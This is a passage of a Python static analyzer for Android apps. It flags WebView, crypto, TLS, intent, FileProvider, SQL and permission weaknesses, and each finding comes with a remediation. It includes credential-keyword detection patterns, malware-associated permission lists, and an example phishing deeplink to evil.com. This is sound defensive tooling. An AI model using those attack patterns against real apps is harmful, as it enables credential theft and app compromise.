    "setJavaScriptEnabled": ("javascript-enabled", "WebView with JavaScript enabled", "medium",
                             "JS in a WebView turns every loaded URL into potential code execution."),
    "addJavascriptInterface": ("js-interface-bridge", "JavaScript-to-Java bridge via addJavascriptInterface", "high",
                               "addJavascriptInterface exposes Java methods to in-WebView JavaScript."),
    "setAllowFileAccessFromFileURLs": ("webview-file-from-file", "WebView allows file URL access from file URLs", "high",
                                       "Permits file:// pages to read other file:// resources."),
    "setAllowUniversalAccessFromFileURLs": ("webview-universal-from-file", "WebView allows universal access from file URLs", "critical",
                                            "Lets file:// pages issue cross-origin requests to ANY origin — SOP bypass."),
}


def analyze_webview(ctx: Ctx) -> list:
    f = []
    found = {}
    for dex in ctx.dex_list:
        try:
            for method in dex.get_methods():
                try:
                    code = method.get_code()
                    if code is None:
                        continue
                    for ins in code.get_bc().get_instructions():
                        op = ins.get_output() or ""
                        for needle in WEBVIEW_CALLS:
                            if needle in op:
                                cls = method.get_class_name()
                                mname = method.get_name()
                                loc = f"{cls}->{mname}"
                                found.setdefault(needle, [])
                                if loc not in found[needle]:
                                    found[needle].append(loc)
                except Exception:
                    continue
        except Exception:
            continue
    ctx.extras["webview_calls"] = found
    for needle, hits in found.items():
        if not hits:
            continue
        fid, title, sev, desc = WEBVIEW_CALLS[needle]
        evidence = "\n".join(hits[:8])
        if len(hits) > 8:
            evidence += f"\n...and {len(hits) - 8} more"
        f.append(Finding(
            id=fid, title=title, severity=sev, category="MASVS-PLATFORM",
            description=desc, evidence=evidence,
            recommendation="Disable the setting unless required. Validate every navigation. Annotate bridge methods with @JavascriptInterface.",
            cwe="CWE-749", masvs="MSTG-PLATFORM-7"))
    return f


WEAK_ALGOS = {"DES": ("weak-cipher-des", "Use of DES", "high"),
              "DESede": ("weak-cipher-3des", "Use of 3DES (DESede)", "medium"),
              "RC4": ("weak-cipher-rc4", "Use of RC4", "high")}
WEAK_HASHES = {"MD5": "high", "MD2": "high", "SHA1": "medium", "SHA-1": "medium"}


def analyze_crypto(ctx: Ctx) -> list:
    f = []
    strings = _get_strings(ctx)
    seen_algos, seen_hashes, ecb_uses = set(), set(), []
    for s in strings:
        for algo, (fid, title, sev) in WEAK_ALGOS.items():
            if algo in s and algo not in seen_algos:
                seen_algos.add(algo)
                f.append(Finding(
                    id=fid, title=title, severity=sev, category="MASVS-CRYPTO",
                    description=f"Reference to weak/legacy cipher {algo}. Modern requirement: AES-GCM with random IVs.",
                    evidence=f"Cipher reference: {s[:120]}",
                    recommendation="Migrate to AES-256-GCM. Use AndroidX Security or Tink.",
                    cwe="CWE-327", masvs="MSTG-CRYPTO-4"))
        for h, sev in WEAK_HASHES.items():
            if h in s and h not in seen_hashes:
                seen_hashes.add(h)
                f.append(Finding(
                    id=f"weak-hash-{h.lower()}", title=f"Use of weak hash: {h}",
                    severity=sev, category="MASVS-CRYPTO",
                    description=f"{h} is unsuitable for cryptographic integrity.",
                    evidence=f"Hash reference: {s[:120]}",
                    recommendation="Use SHA-256/SHA-3. For passwords use Argon2id, scrypt, PBKDF2.",
                    cwe="CWE-328", masvs="MSTG-CRYPTO-4"))
        if "/ECB/" in s or s.endswith("/ECB"):
            ecb_uses.append(s)
    if ecb_uses:
        f.append(Finding(
            id="cipher-ecb-mode", title="Cipher used in ECB mode", severity="high",
            category="MASVS-CRYPTO",
            description="ECB encrypts identical plaintext blocks to identical ciphertext, leaking structure.",
            evidence="\n".join(sorted(set(ecb_uses))[:6]),
            recommendation="Switch to AES-GCM with random nonce.",
            cwe="CWE-327", masvs="MSTG-CRYPTO-3"))
    return f


def analyze_network(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    nsc_path = None
    try:
        nsc_path = apk.get_element("application", "networkSecurityConfig")
    except Exception:
        pass
    nsc_xml = ""
    if nsc_path:
        try:
            for fn in apk.get_files():
                if fn.startswith("res/xml/") and fn.endswith(".xml"):
                    try:
                        data = apk.get_file(fn).decode("utf-8", errors="ignore")
                        if "network-security-config" in data:
                            nsc_xml = data
                            break
                    except Exception:
                        continue
        except Exception:
            pass
    if nsc_xml:
        if 'cleartextTrafficPermitted="true"' in nsc_xml:
            f.append(Finding(
                id="nsc-cleartext", title="NSC permits cleartext traffic", severity="high",
                category="MASVS-NETWORK",
                description="cleartextTrafficPermitted=true allows plain HTTP, vulnerable to MITM.",
                evidence='cleartextTrafficPermitted="true" found in NSC',
                recommendation="Remove the attribute. Scope dev hosts tightly.",
                cwe="CWE-319", masvs="MSTG-NETWORK-1"))
        if "<trust-anchors>" in nsc_xml and "user" in nsc_xml:
            f.append(Finding(
                id="nsc-user-cas", title="User-installed CAs trusted", severity="medium",
                category="MASVS-NETWORK",
                description="Trusting user CAs makes it trivial for malware to MITM traffic.",
                evidence="user trust-anchor present",
                recommendation="Remove user trust-anchor in release builds.",
                cwe="CWE-295", masvs="MSTG-NETWORK-3"))
    bypass_classes = []
    for dex in ctx.dex_list:
        try:
            for cls in dex.get_classes():
                try:
                    cls_name = cls.get_name()
                    for method in cls.get_methods():
                        if method.get_name() in ("checkClientTrusted", "checkServerTrusted"):
                            code = method.get_code()
                            if code is None or code.get_length() <= 8:
                                bypass_classes.append(cls_name)
                                break
                except Exception:
                    continue
        except Exception:
            continue
    if bypass_classes:
        f.append(Finding(
            id="trustmanager-bypass", title="Custom TrustManager that accepts all certificates",
            severity="critical", category="MASVS-NETWORK",
            description="Empty checkServerTrusted method bodies. Disables certificate validation entirely.",
            evidence="\n".join(bypass_classes[:8]),
            recommendation="Remove the custom TrustManager. Use OkHttp CertificatePinner.",
            cwe="CWE-295", masvs="MSTG-NETWORK-3"))
    return f


DANGEROUS_PERMS = {
    "android.permission.READ_SMS", "android.permission.SEND_SMS",
    "android.permission.READ_CONTACTS", "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.RECORD_AUDIO", "android.permission.CAMERA",
    "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE",
    "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.SYSTEM_ALERT_WINDOW", "android.permission.BIND_ACCESSIBILITY_SERVICE",
    "android.permission.REQUEST_INSTALL_PACKAGES", "android.permission.QUERY_ALL_PACKAGES",
}


def analyze_permissions(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        perms = list(apk.get_permissions() or [])
    except Exception:
        perms = []
    ctx.extras["permissions"] = perms
    flagged = [p for p in perms if p in DANGEROUS_PERMS]
    if flagged:
        f.append(Finding(
            id="dangerous-permissions",
            title=f"Dangerous runtime permissions requested ({len(flagged)})",
            severity="info" if len(flagged) <= 3 else "low",
            category="MASVS-PLATFORM",
            description="Sensitive permissions requested. Pay special attention to BIND_ACCESSIBILITY_SERVICE, SYSTEM_ALERT_WINDOW, REQUEST_INSTALL_PACKAGES.",
            evidence="\n".join(flagged[:30]),
            recommendation="Remove unused permissions."))
    return f


def analyze_natives(ctx: Ctx) -> list:
    libs = {}
    try:
        for fn in ctx.apk.get_files():
            if fn.startswith("lib/") and fn.endswith(".so"):
                parts = fn.split("/")
                if len(parts) >= 3:
                    libs.setdefault(parts[1], []).append(parts[2])
    except Exception:
        pass
    if not libs:
        return []
    ctx.extras["natives"] = libs
    total = sum(len(v) for v in libs.values())
    return [Finding(
        id="native-libs", title=f"Native libraries present ({total} files, {len(libs)} ABI(s))",
        severity="info", category="MASVS-CODE",
        description="Native (JNI) code is a frequent source of memory-corruption vulnerabilities.",
        evidence=", ".join(f"{abi}: {len(v)}" for abi, v in libs.items()),
        recommendation="Verify each .so was built with stack canaries, RELRO, NX, PIE.",
        masvs="MSTG-CODE-9", metadata={"libs": libs})]



# =============================================================================
# Comprehensive Android Analyzers
# Covers OVAA (Oversecured Vulnerable Android App), MobSF static rules,
# Oversecured public blog patterns, MobileHackingLab labs, MASTG,
# StrandHogg variants, and modern Android attack categories.
# Each finding has a confidence: confirmed > likely > possible
# =============================================================================

# ----- Helpers --------------------------------------------------------------
def _scan_dex_for(ctx: Ctx, needles: list) -> dict:
    """Scan DEX methods for any of the provided method-signature substrings.
    Returns {needle: [class->method, ...]}."""
    hits = {n: [] for n in needles}
    for dex in ctx.dex_list:
        try:
            for method in dex.get_methods():
                try:
                    code = method.get_code()
                    if code is None: continue
                    for ins in code.get_bc().get_instructions():
                        op = ins.get_output() or ""
                        for n in needles:
                            if n in op:
                                hits[n].append(f"{method.get_class_name()}->{method.get_name()}")
                                break
                except Exception:
                    continue
        except Exception:
            continue
    return {n: sorted(set(v)) for n, v in hits.items()}


def _all_dex_strings(ctx: Ctx, limit: int = 80000) -> list:
    cached = _get_strings(ctx)
    if limit >= len(cached):
        return cached
    return cached[:limit]


def _has_any_string(ctx: Ctx, *needles) -> bool:
    needles = tuple(needles)
    for s in _get_strings(ctx):
        if any(n in s for n in needles):
            return True
    return False


def _has_method(ctx: Ctx, *needles) -> bool:
    found = _scan_dex_for(ctx, list(needles))
    return any(found.values())


# =============================================================================
# StrandHogg / Task Hijacking
# =============================================================================
def analyze_task_hijacking(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        min_sdk = int(apk.get_min_sdk_version() or 0)
    except Exception:
        min_sdk = 0
    if min_sdk >= 30:
        return f  # patched in Android 11+
    risky = []
    try:
        for elem in (apk.find_tags("activity") or []):
            try:
                lm = apk.get_value_from_tag(elem, "launchMode") or ""
                ta = apk.get_value_from_tag(elem, "taskAffinity")
                name = apk.get_value_from_tag(elem, "name") or "?"
                if lm in ("singleTask", "singleInstance"):
                    if ta is None or ta != "":
                        risky.append(f"{name}: launchMode={lm} taskAffinity={ta or '<default>'}")
            except Exception:
                continue
    except Exception:
        pass
    if risky:
        f.append(Finding(
            id="task-hijacking-strandhogg",
            title=f"StrandHogg 1.0 candidate: {len(risky)} activity(ies)",
            severity="high", category="MASVS-PLATFORM",
            description=("App uses launchMode=singleTask/singleInstance with default or non-empty "
                         "taskAffinity AND minSdk<30. A malicious app can spoof the task affinity "
                         "and have its own activity shown when the user opens this app — phishing "
                         "the login UI."),
            evidence="\n".join(risky[:10]),
            recommendation='Set android:taskAffinity="" at <application> level, or upgrade minSdk to 30+.',
            cwe="CWE-940", masvs="MSTG-PLATFORM-1",
            references=["https://developer.android.com/privacy-and-security/risks/strandhogg"],
            confidence="confirmed", source="strandhogg",
        ))
    return f


# =============================================================================
# OVAA: login_url replacement via deeplink
# =============================================================================
def analyze_open_redirect_via_deeplink(ctx: Ctx) -> list:
    """Detects deeplinks that load a URL parameter into a WebView — OVAA's login_url scenario."""
    f = []
    extras = ctx.extras or {}
    deeplinks = extras.get("deeplinks", []) or []
    has_webview = _has_method(ctx, "Landroid/webkit/WebView;->loadUrl",
                              "Landroid/webkit/WebView;->loadDataWithBaseURL")
    has_intent_data = _has_method(ctx, "Landroid/content/Intent;->getData",
                                  "Landroid/net/Uri;->getQueryParameter")
    if deeplinks and has_webview and has_intent_data:
        f.append(Finding(
            id="deeplink-webview-open-redirect",
            title="Deeplink → WebView pattern (OVAA login_url-class)",
            severity="high", category="MASVS-PLATFORM",
            description=("App registers deeplinks AND extracts URL parameters from intents AND "
                         "loads URLs into WebView. Classic OVAA login_url scenario — an attacker "
                         "page can fire `app://login?url=https://evil.com` to load attacker content "
                         "in the app's WebView, harvesting credentials."),
            evidence=f"Found {len(deeplinks)} deeplink(s); WebView.loadUrl + Uri.getQueryParameter present",
            recommendation=("Validate every URL extracted from intents against a strict allow-list "
                            "of trusted domains BEFORE passing to WebView."),
            cwe="CWE-601", masvs="MSTG-PLATFORM-3",
            references=["https://github.com/oversecured/ovaa"],
            confidence="likely", source="oversecured",
        ))
    return f


# =============================================================================
# OVAA: Intent redirection via getParcelableExtra
# =============================================================================
def analyze_intent_redirection(ctx: Ctx) -> list:
    f = []
    redirectors = []
    for dex in ctx.dex_list:
        try:
            for method in dex.get_methods():
                try:
                    code = method.get_code()
                    if code is None: continue
                    has_extract = False
                    has_start = False
                    for ins in code.get_bc().get_instructions():
                        op = ins.get_output() or ""
                        if "getParcelableExtra" in op or "getParcelable" in op:
                            has_extract = True
                        if ("startActivity" in op or "startService" in op
                            or "sendBroadcast" in op or "startActivities" in op):
                            has_start = True
                    if has_extract and has_start:
                        redirectors.append(f"{method.get_class_name()}->{method.get_name()}")
                except Exception:
                    continue
        except Exception:
            continue
    redirectors = sorted(set(redirectors))
    if redirectors:
        f.append(Finding(
            id="intent-redirection",
            title=f"Intent-redirection sink in {len(redirectors)} method(s)",
            severity="high", category="MASVS-PLATFORM",
            description=("Method extracts an Intent from extras and forwards it to "
                         "startActivity/startService/sendBroadcast. If reachable from an exported "
                         "component, an attacker can target internal/protected components — the "
                         "Oversecured Intent-redirection finding."),
            evidence="\n".join(redirectors[:8]),
            recommendation=("Validate the extracted Intent before forwarding: check getComponent() "
                            "against an allow-list, drop GRANT_*_URI_PERMISSION flags."),
            cwe="CWE-441", masvs="MSTG-PLATFORM-4",
            references=["https://blog.oversecured.com/Android-Access-to-app-protected-components/"],
            confidence="likely", source="oversecured",
        ))
    return f


# =============================================================================
# OVAA: FileProvider broad/root paths
# =============================================================================
def analyze_fileprovider_paths(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    risky = []
    permissive = False
    try:
        for fn in apk.get_files():
            if fn.startswith("res/xml/") and fn.endswith(".xml"):
                try:
                    data = apk.get_file(fn).decode("utf-8", errors="ignore")
                    if "<paths>" in data or "external-path" in data or "root-path" in data:
                        if 'path="."' in data or 'path="/"' in data or 'path=""' in data:
                            permissive = True
                            risky.append(f"{fn}: broad path entry")
                        if "<root-path" in data:
                            permissive = True
                            risky.append(f"{fn}: root-path exposed (entire device storage)")
                except Exception:
                    continue
    except Exception:
        pass
    grants_perms = False
    try:
        for elem in (apk.find_tags("provider") or []):
            try:
                if apk.get_value_from_tag(elem, "grantUriPermissions") == "true":
                    grants_perms = True
                    name = apk.get_value_from_tag(elem, "name") or ""
                    risky.append(f"{name}: grantUriPermissions=true")
            except Exception:
                continue
    except Exception:
        pass
    if permissive or (grants_perms and risky):
        f.append(Finding(
            id="fileprovider-broad-paths",
            title="FileProvider exposes broad/root paths",
            severity="high", category="MASVS-PLATFORM",
            description=("FileProvider configuration exposes broad filesystem paths via overly-wide "
                         "<paths> entries combined with grantUriPermissions=true. Classic Oversecured "
                         "FileProvider path traversal scenario."),
            evidence="\n".join(risky[:8]),
            recommendation=("Scope <paths> to specific subdirectories. Avoid <root-path>. "
                            "Validate URIs handed to openFile() against canonical-path allow-list."),
            cwe="CWE-22", masvs="MSTG-STORAGE-2",
            references=["https://blog.oversecured.com/Android-Path-Traversal-via-FileProvider/"],
            confidence="confirmed" if permissive else "likely", source="oversecured",
        ))
    return f


# =============================================================================
# OVAA: grant URI permissions abuse via setResult
# =============================================================================
def analyze_grant_uri_permission_setresult(ctx: Ctx) -> list:
    f = []
    has_setresult = _has_method(ctx, "Landroid/app/Activity;->setResult")
    has_grant = _has_any_string(ctx, "FLAG_GRANT_READ_URI_PERMISSION",
                                 "FLAG_GRANT_WRITE_URI_PERMISSION")
    if has_setresult and has_grant:
        f.append(Finding(
            id="grant-uri-via-setresult",
            title="setResult + GRANT_*_URI_PERMISSION pattern",
            severity="medium", category="MASVS-PLATFORM",
            description=("App uses setResult() with intents that have GRANT_*_URI_PERMISSION flags. "
                         "If the activity is exported and started for-result by a malicious app, "
                         "the attacker receives a permission grant on the URI — OVAA's "
                         "grant_uri_permissions scenario."),
            evidence="Activity.setResult + GRANT_*_URI_PERMISSION strings present",
            recommendation="Verify the calling package before granting URI permissions in setResult().",
            cwe="CWE-275", masvs="MSTG-PLATFORM-4",
            references=["https://github.com/oversecured/ovaa"],
            confidence="possible", source="oversecured",
        ))
    return f


# =============================================================================
# WebView allowFileAccessFromFileURLs (OVAA)
# =============================================================================
def analyze_webview_file_access(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, [
        "setAllowFileAccessFromFileURLs(Z)V",
        "setAllowUniversalAccessFromFileURLs(Z)V",
    ])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="webview-file-access",
            title=f"WebView setAllow*FromFileURLs at {len(locs)} site(s)",
            severity="high", category="MASVS-PLATFORM",
            description=("setAllowFileAccessFromFileURLs / setAllowUniversalAccessFromFileURLs "
                         "called. Combined with attacker-controlled file:// URI, the page can XHR "
                         "private files out of the app. Direct OVAA finding."),
            evidence="\n".join(locs[:8]),
            recommendation="Set both to false. Don't load attacker-controlled file:// URIs in WebView.",
            cwe="CWE-552", masvs="MSTG-PLATFORM-7",
            confidence="confirmed", source="oversecured",
        ))
    return f


# =============================================================================
# WebView setJavaScriptEnabled + addJavascriptInterface combo
# =============================================================================
def analyze_webview_js_bridge(ctx: Ctx) -> list:
    f = []
    has_js = _has_method(ctx, "setJavaScriptEnabled(Z)V")
    has_iface = _has_method(ctx, "addJavascriptInterface")
    if has_js and has_iface:
        f.append(Finding(
            id="webview-js-bridge",
            title="WebView JavaScript bridge with setJavaScriptEnabled + addJavascriptInterface",
            severity="high", category="MASVS-PLATFORM",
            description=("App enables JS in WebView and exposes a JavaScript-to-Java bridge. If "
                         "the WebView loads attacker-controlled content (HTTP, deeplink), the "
                         "attacker can call any @JavascriptInterface method."),
            evidence="setJavaScriptEnabled + addJavascriptInterface both present",
            recommendation=("Only expose interfaces marked @JavascriptInterface (API 17+). Restrict "
                            "WebView to trusted origins via shouldOverrideUrlLoading. Avoid bridges "
                            "where possible."),
            cwe="CWE-749", masvs="MSTG-PLATFORM-7",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# WebView mixed content + onReceivedSslError
# =============================================================================
def analyze_webview_mixed_content(ctx: Ctx) -> list:
    f = []
    if _has_any_string(ctx, "MIXED_CONTENT_ALWAYS_ALLOW"):
        f.append(Finding(
            id="webview-mixed-content",
            title="WebView setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)",
            severity="high", category="MASVS-NETWORK",
            description="WebView allows HTTP content inside HTTPS pages — MITM injection vector.",
            evidence="MIXED_CONTENT_ALWAYS_ALLOW in DEX strings",
            recommendation="Use MIXED_CONTENT_NEVER_ALLOW (or COMPATIBILITY for legacy needs).",
            cwe="CWE-319", masvs="MSTG-NETWORK-1",
            confidence="confirmed", source="mobsf",
        ))
    return f


def analyze_webview_ssl_error_handler(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["onReceivedSslError"])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="webview-ssl-error-handler",
            title=f"onReceivedSslError handler at {len(locs)} site(s)",
            severity="high", category="MASVS-NETWORK",
            description=("WebViewClient.onReceivedSslError is overridden. Many apps call "
                         "handler.proceed() unconditionally, accepting any TLS error → full MITM."),
            evidence="\n".join(locs[:6]),
            recommendation="Always call handler.cancel() in onReceivedSslError, never proceed().",
            cwe="CWE-295", masvs="MSTG-NETWORK-3",
            confidence="likely", source="mobsf",
        ))
    return f


def analyze_webview_dom_storage(ctx: Ctx) -> list:
    f = []
    if _has_method(ctx, "setDomStorageEnabled(Z)V"):
        # Only flag when JavaScript is also enabled
        if _has_method(ctx, "setJavaScriptEnabled(Z)V"):
            f.append(Finding(
                id="webview-dom-storage",
                title="WebView with DOM storage enabled",
                severity="info", category="MASVS-STORAGE",
                description=("WebView has setDomStorageEnabled(true). DOM storage persists in app's "
                             "private storage but is accessible from any page loaded in the WebView."),
                evidence="setDomStorageEnabled + setJavaScriptEnabled present",
                recommendation="Disable if not needed, or clear storage when WebView is destroyed.",
                masvs="MSTG-STORAGE-2",
                confidence="confirmed", source="mobsf",
            ))
    return f


# =============================================================================
# PendingIntent mutability
# =============================================================================
def analyze_pendingintent_mutable(ctx: Ctx) -> list:
    f = []
    has_get = _has_method(ctx, "Landroid/app/PendingIntent;->getActivity",
                          "Landroid/app/PendingIntent;->getBroadcast",
                          "Landroid/app/PendingIntent;->getService")
    if not has_get: return f
    has_immutable = _has_any_string(ctx, "FLAG_IMMUTABLE")
    if not has_immutable:
        try:
            target = int(ctx.apk.get_target_sdk_version() or 0)
        except Exception:
            target = 0
        sev = "high" if target >= 31 else "medium"
        f.append(Finding(
            id="pendingintent-mutable",
            title="PendingIntent.get*() without FLAG_IMMUTABLE",
            severity=sev, category="MASVS-PLATFORM",
            description=("PendingIntent created without FLAG_IMMUTABLE. A receiving app can supply "
                         "a 'fillInIntent' to set unspecified fields, redirecting the action with "
                         "the calling app's identity. On Android 12+ targetSdk 31+, missing flag "
                         "is a hard error."),
            evidence="PendingIntent.get* present; FLAG_IMMUTABLE absent",
            recommendation="Always pass FLAG_IMMUTABLE unless mutability is genuinely needed.",
            cwe="CWE-927", masvs="MSTG-PLATFORM-11",
            confidence="likely", source="oversecured",
        ))
    return f


# =============================================================================
# Janus / V1-only signing
# =============================================================================
def analyze_janus(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        v1, v2, v3 = apk.is_signed_v1(), apk.is_signed_v2(), apk.is_signed_v3()
        min_sdk = int(apk.get_min_sdk_version() or 0)
    except Exception:
        return f
    if v1 and not (v2 or v3):
        sev = "high" if min_sdk < 26 else "low"
        f.append(Finding(
            id="janus-v1-only",
            title="APK signed with v1 scheme only" + (" (Janus-vulnerable)" if min_sdk < 26 else ""),
            severity=sev, category="MASVS-CODE",
            description=("Only legacy JAR signing. v2 (API 24+) / v3 (API 28+) provide stronger "
                         "integrity. With minSdk<26 the APK is vulnerable to Janus (CVE-2017-13156)."),
            evidence=f"signed_v1={v1}, signed_v2={v2}, signed_v3={v3}, minSdk={min_sdk}",
            recommendation="Enable APK Signature Scheme v2/v3 in build configuration.",
            cwe="CWE-345", masvs="MSTG-CODE-1",
            confidence="confirmed", source="cve",
        ))
    return f


# =============================================================================
# SQL Injection
# =============================================================================
def analyze_sql_injection_db(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, [
        "Landroid/database/sqlite/SQLiteDatabase;->rawQuery",
        "Landroid/database/sqlite/SQLiteDatabase;->execSQL",
        "Landroid/database/sqlite/SQLiteQueryBuilder;->query",
    ])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        sql_lit = []
        for s in _all_dex_strings(ctx, 50000):
            if re.search(r"(?i)\b(SELECT|INSERT|UPDATE|DELETE)\s+\w", s) and "?" not in s and len(s) < 200:
                sql_lit.append(s)
        sev = "high" if sql_lit else "medium"
        f.append(Finding(
            id="sqlite-injection-risk",
            title=f"SQLite raw queries at {len(locs)} location(s)",
            severity=sev, category="MASVS-CODE",
            description=("rawQuery/execSQL execute raw SQL strings. If built by concatenating "
                         "Intent extras, deeplink params, or other untrusted input, the app is "
                         "vulnerable to SQL injection in its local DB."),
            evidence=f"Call sites: {len(locs)}\nSQL literals without ?: {len(sql_lit)}",
            recommendation="Use parameterised queries (selectionArgs[] with ?) or Room with @Query.",
            cwe="CWE-89", masvs="MSTG-CODE-2",
            confidence="likely" if sql_lit else "possible", source="mhl",
        ))
    return f


# =============================================================================
# Runtime.exec / ProcessBuilder
# =============================================================================
def analyze_runtime_exec(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Ljava/lang/Runtime;->exec",
                                "Ljava/lang/ProcessBuilder;-><init>"])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="runtime-exec",
            title=f"Runtime.exec / ProcessBuilder usage at {len(locs)} site(s)",
            severity="medium", category="MASVS-CODE",
            description=("Code executes shell commands. If any argument is influenced by external "
                         "input without strict validation, this is a command-injection primitive."),
            evidence="\n".join(locs[:6]),
            recommendation=("Avoid shell exec. If unavoidable, use exec(String[]) with fixed argv "
                            "and validate every dynamic argument."),
            cwe="CWE-78", masvs="MSTG-CODE-8",
            confidence="possible", source="mhl",
        ))
    return f


# =============================================================================
# Dynamic Code Loading
# =============================================================================
def analyze_dynamic_code_loading(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Ldalvik/system/DexClassLoader;-><init>",
                                "Ldalvik/system/PathClassLoader;-><init>",
                                "Ldalvik/system/InMemoryDexClassLoader;-><init>"])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="dynamic-code-loading",
            title=f"Dynamic DEX/class loading at {len(locs)} site(s)",
            severity="high", category="MASVS-CODE",
            description=("App loads DEX/APK code at runtime. If the loaded path is on external "
                         "storage, downloaded over insecure channels, or otherwise modifiable, "
                         "an attacker can substitute the code = full app compromise."),
            evidence="\n".join(locs[:6]),
            recommendation="Avoid. If required, load only from internal storage with signature verification.",
            cwe="CWE-829", masvs="MSTG-CODE-9",
            confidence="confirmed", source="mhl",
        ))
    return f


# =============================================================================
# World-Readable / Writable Storage Modes
# =============================================================================
def analyze_world_mode_storage(ctx: Ctx) -> list:
    f = []
    if _has_any_string(ctx, "MODE_WORLD_READABLE", "MODE_WORLD_WRITEABLE"):
        f.append(Finding(
            id="world-mode-storage",
            title="MODE_WORLD_READABLE/WRITEABLE referenced",
            severity="medium", category="MASVS-STORAGE",
            description=("App references MODE_WORLD_READABLE/WRITEABLE constants. On legacy "
                         "Android these expose preferences/files to every app on the device. "
                         "Deprecated since API 17; throws SecurityException on API 24+."),
            evidence="MODE_WORLD_* in dex strings",
            recommendation="Use MODE_PRIVATE only. For sensitive prefs use AndroidX Security.",
            cwe="CWE-732", masvs="MSTG-STORAGE-2",
            confidence="likely", source="mastg",
        ))
    return f


# =============================================================================
# External Storage
# =============================================================================
def analyze_external_storage(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, [
        "Landroid/os/Environment;->getExternalStorageDirectory",
        "Landroid/os/Environment;->getExternalStoragePublicDirectory",
        "getExternalFilesDir",
    ])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="external-storage-usage",
            title=f"External storage write/read at {len(locs)} site(s)",
            severity="low", category="MASVS-STORAGE",
            description=("App uses external storage. Files written there are readable by any app "
                         "with READ_EXTERNAL_STORAGE on legacy Android."),
            evidence=f"{len(locs)} call sites",
            recommendation="Use internal storage; encrypt anything sensitive.",
            cwe="CWE-922", masvs="MSTG-STORAGE-2",
            confidence="possible", source="mastg",
        ))
    return f


# =============================================================================
# Insecure Logging of Credentials
# =============================================================================
def analyze_insecure_logging(ctx: Ctx) -> list:
    f = []
    susp = []
    keywords = re.compile(r"(?i)(password|passwd|pwd|secret|token|apikey|api_key|bearer|jwt|otp|pin|ssn|credit_?card)")
    for dex in ctx.dex_list:
        try:
            for method in dex.get_methods():
                try:
                    code = method.get_code()
                    if code is None: continue
                    last_kw = False
                    for ins in code.get_bc().get_instructions():
                        op = ins.get_output() or ""
                        nm = ins.get_name() or ""
                        if "const-string" in nm and keywords.search(op):
                            last_kw = True
                        elif "Landroid/util/Log;->" in op and last_kw:
                            susp.append(f"{method.get_class_name()}->{method.get_name()}")
                            break
                except Exception:
                    continue
        except Exception:
            continue
    susp = sorted(set(susp))
    if susp:
        f.append(Finding(
            id="insecure-logging",
            title=f"Possible logging of credentials at {len(susp)} method(s)",
            severity="medium", category="MASVS-STORAGE",
            description=("Methods reference credential-related strings near android.util.Log calls. "
                         "Sensitive data in logcat can be read via adb logcat in dev builds."),
            evidence="\n".join(susp[:8]),
            recommendation="Strip debug logging in release. Use BuildConfig.DEBUG guards.",
            cwe="CWE-532", masvs="MSTG-STORAGE-3",
            confidence="possible", source="mastg",
        ))
    return f


# =============================================================================
# Custom Permissions Weak Protection
# =============================================================================
def analyze_custom_permissions(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    weak = []
    try:
        for elem in (apk.find_tags("permission") or []):
            try:
                name = apk.get_value_from_tag(elem, "name") or "?"
                level = (apk.get_value_from_tag(elem, "protectionLevel") or "normal").lower()
                if not any(x in level for x in ("signature", "system", "privileged")):
                    weak.append(f"{name}: {level}")
            except Exception:
                continue
    except Exception:
        pass
    if weak:
        f.append(Finding(
            id="custom-perm-weak",
            title=f"{len(weak)} custom permission(s) with weak protectionLevel",
            severity="medium", category="MASVS-PLATFORM",
            description=("Custom permissions without 'signature' protectionLevel can be claimed "
                         "by any app installed before this one (legacy Android), bypassing access control."),
            evidence="\n".join(weak[:8]),
            recommendation='Set android:protectionLevel="signature".',
            cwe="CWE-275", masvs="MSTG-PLATFORM-1",
            confidence="confirmed", source="mastg",
        ))
    return f


# =============================================================================
# Dangerous Permissions
# =============================================================================
def analyze_dangerous_perms(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        perms = list(apk.get_permissions() or [])
    except Exception:
        perms = []

    dangerous = {
        "android.permission.SYSTEM_ALERT_WINDOW": (
            "overlay-permission", "SYSTEM_ALERT_WINDOW (overlay) permission", "medium",
            "Foundation of tapjacking, phishing overlays, and clickjacking.",
            "Avoid unless required (chat heads). Never overlay other apps' auth/payment screens.",
            "CWE-1021"),
        "android.permission.BIND_DEVICE_ADMIN": (
            "device-admin", "BIND_DEVICE_ADMIN permission", "high",
            "Device admin can lock/wipe device, control passwords. Common in malware.",
            "Required only for MDM apps. Document in privacy policy.",
            "CWE-269"),
        "android.permission.READ_PHONE_STATE": (
            "read-phone-state", "READ_PHONE_STATE permission", "info",
            "Allows reading IMEI/IMSI on legacy Android. Often used for device fingerprinting.",
            "Use Settings.Secure.ANDROID_ID for identifier; respect Play policies.",
            "CWE-359"),
        "android.permission.READ_SMS": (
            "read-sms", "READ_SMS permission", "high",
            "Banking trojan favourite — read SMS for OTP interception.",
            "Use Google Play SMS Verification API instead (broadcast-based).",
            "CWE-359"),
        "android.permission.RECEIVE_SMS": (
            "receive-sms", "RECEIVE_SMS permission", "high",
            "Same as READ_SMS — OTP interception risk.",
            "Use Google Play SMS Verification API (broadcast-based).",
